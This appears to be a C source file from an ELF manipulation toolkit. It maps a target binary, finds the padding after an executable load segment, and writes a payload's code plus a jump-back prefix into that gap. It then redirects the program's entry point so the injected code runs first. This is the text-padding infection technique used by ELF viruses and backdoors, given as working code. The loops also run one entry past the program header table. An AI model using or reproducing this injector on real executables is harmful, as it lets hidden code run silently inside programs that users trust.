#define _GNU_SOURCE

#include <elf.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>

#include "elftoolkit.h"

extern void payload_prefix_intel();
extern int payload_prefix_intel_length;

int get_elf_class(Mapped_Elf *elf);
Elf32_Shdr *elf32_find_section(Mapped_Elf *, char *);
Elf64_Shdr *elf64_find_section(Mapped_Elf *, char *);

Mapped_Elf *map_elf(char *filename, int private) {
    Mapped_Elf *elf = malloc(sizeof(Mapped_Elf));
    if (elf == NULL)
        DIE("error allocating memory for metadata");

    // open and map the file
    elf->fd = open(filename, O_RDWR);
    if (elf->fd == -1)
        DIE("error opening file: %s\n", filename);

    struct stat st;
    if (fstat(elf->fd, &st) == -1)
        DIE("error getting target file info\n");
    elf->size = st.st_size;

    elf->data = mmap(NULL, elf->size, PROT_READ | PROT_WRITE, (private) ? MAP_PRIVATE : MAP_SHARED, elf->fd, 0);
    if (elf->data == MAP_FAILED)
        DIE("failed to map file: %s\n", filename);

    // check for magic bytes
    if (!(elf->data[EI_MAG0] == ELFMAG0 && elf->data[EI_MAG1] == ELFMAG1 && elf->data[EI_MAG2] == ELFMAG2 &&
          elf->data[EI_MAG3] == ELFMAG3))
        DIE("missing ELF magic bytes\n");

    // get pointers to the elf header, section and program header tables, and the string table if it exists
    elf->class = get_elf_class(elf);
    if (elf->class == ELFCLASS32) {
        elf->ehdr32 = (Elf32_Ehdr *)elf->data;
        elf->phdr32 = (Elf32_Phdr *)(elf->data + elf->ehdr32->e_phoff);
        elf->shdr32 = (Elf32_Shdr *)(elf->data + elf->ehdr32->e_shoff);

        if (elf->ehdr32->e_shstrndx == SHN_UNDEF || elf->ehdr32->e_shstrndx == SHN_XINDEX)
            elf->strtab = NULL;
        else
            elf->strtab = (uint8_t *)(elf->data + elf->shdr32[elf->ehdr32->e_shstrndx].sh_offset);
    } else if (elf->class == ELFCLASS64) {
        elf->ehdr64 = (Elf64_Ehdr *)elf->data;
        elf->phdr64 = (Elf64_Phdr *)(elf->data + elf->ehdr64->e_phoff);
        elf->shdr64 = (Elf64_Shdr *)(elf->data + elf->ehdr64->e_shoff);

        if (elf->ehdr64->e_shstrndx == SHN_UNDEF || elf->ehdr64->e_shstrndx == SHN_XINDEX)
            elf->strtab = NULL;
        else
            elf->strtab = (uint8_t *)(elf->data + elf->shdr64[elf->ehdr64->e_shstrndx].sh_offset);
    } else
        DIE("unsupported elf class (not 32/64 bit)\n");

    return elf;
}

void unmap_elf(Mapped_Elf *elf, int private) {
    if (!private)
        msync(elf->data, elf->size, MS_SYNC);
    munmap(elf->data, elf->size);
    close(elf->fd);
    free(elf);
}

void patch_text_gap(Mapped_Elf *target, Mapped_Elf *payload) {
    if (target->class == ELFCLASS32) {
        Elf32_Shdr *payload_text_section = elf32_find_section(payload, ".text");
        if (payload_text_section == NULL)
            DIE("no .text found in payload\n");

        // look for a loadable, executable segment with a large enough gap for the payload
        for (int i = 0; i <= target->ehdr32->e_phnum; i++) {
            if (target->phdr32[i].p_type != PT_LOAD)
                continue;

            if ((target->phdr32[i].p_flags & (PF_R | PF_X)) != (PF_R | PF_X))
                continue;

            if (PAD(target->phdr32[i].p_memsz, target->phdr32[i].p_align) - target->phdr32[i].p_memsz <
                payload_text_section->sh_size + payload_prefix_intel_length)
                continue;

            // set entry point (10 accounts for the offset of the jmp back to the original entry point)
            uint32_t entry_point_offset =
                    target->ehdr32->e_entry - (target->phdr32[i].p_vaddr + target->phdr32[i].p_memsz + 10);
            target->ehdr32->e_entry = target->phdr32[i].p_vaddr + target->phdr32[i].p_memsz;

            // write payload prefix, then patch in the offset of the original entry point for the jmp in the prefix
            uint8_t *patch_offset = target->data + target->phdr32[i].p_offset + target->phdr32[i].p_filesz;
            memcpy(patch_offset, &payload_prefix_intel, payload_prefix_intel_length);
            memcpy(patch_offset + 6, &entry_point_offset, sizeof(uint32_t));

            // add payload
            memcpy(patch_offset + payload_prefix_intel_length, payload->data + payload_text_section->sh_offset,
                   payload_text_section->sh_size);
            target->phdr32[i].p_filesz += payload_text_section->sh_size + payload_prefix_intel_length;
            target->phdr32[i].p_memsz += payload_text_section->sh_size + payload_prefix_intel_length;
        }
    } else if (target->class == ELFCLASS64) {
        Elf64_Shdr *payload_text_section = elf64_find_section(payload, ".text");
        if (payload_text_section == NULL)
            DIE("no .text found in payload\n");

        // look for a loadable, executable segment with a large enough gap for the payload
        for (int i = 0; i <= target->ehdr64->e_phnum; i++) {
            if (target->phdr64[i].p_type != PT_LOAD)
                continue;

            if ((target->phdr64[i].p_flags & (PF_R | PF_X)) != (PF_R | PF_X))
                continue;

            if (PAD(target->phdr64[i].p_memsz, target->phdr64[i].p_align) - target->phdr64[i].p_memsz <
                payload_text_section->sh_size + payload_prefix_intel_length)
                continue;

            // set entry point (10 accounts for the offset of the jmp back to the original entry point)
            uint32_t entry_point_offset =
                    target->ehdr64->e_entry - (target->phdr64[i].p_vaddr + target->phdr64[i].p_memsz + 10);
            target->ehdr64->e_entry = target->phdr64[i].p_vaddr + target->phdr64[i].p_memsz;

            // write payload prefix, then patch in the offset of the original entry point for the jmp in the prefix
            uint8_t *patch_offset = target->data + target->phdr64[i].p_offset + target->phdr64[i].p_filesz;
            memcpy(patch_offset, &payload_prefix_intel, payload_prefix_intel_length);
            memcpy(patch_offset + 6, &entry_point_offset, sizeof(uint32_t));

            // add payload
            memcpy(patch_offset + payload_prefix_intel_length, payload->data + payload_text_section->sh_offset,
                   payload_text_section->sh_size);
            target->phdr64[i].p_filesz += payload_text_section->sh_size + payload_prefix_intel_length;
            target->phdr64[i].p_memsz += payload_text_section->sh_size + payload_prefix_intel_length;
        }
    }
}

Elf32_Shdr *elf32_find_section(Mapped_Elf *elf, char *name) {
    if (!elf->strtab)
        return NULL;

    for (int i = 0; i < elf->ehdr32->e_shnum; i++)
        if (!strcmp((char *)&(elf->strtab[elf->shdr32[i].sh_name]), name))
            return &(elf->shdr32[i]);

    return NULL;
}

Elf64_Shdr *elf64_find_section(Mapped_Elf *elf, char *name) {
    if (!elf->strtab)
        return NULL;

    for (int i = 0; i < elf->ehdr64->e_shnum; i++)
        if (!strcmp((char *)&(elf->strtab[elf->shdr64[i].sh_name]), name))
            return &(elf->shdr64[i]);

    return NULL;
}

int get_elf_class(Mapped_Elf *elf) {
    if (!elf->data[EI_CLASS] || elf->data[EI_CLASS] >= ELFCLASSNUM)
        return 0;

    return elf->data[EI_CLASS];
}
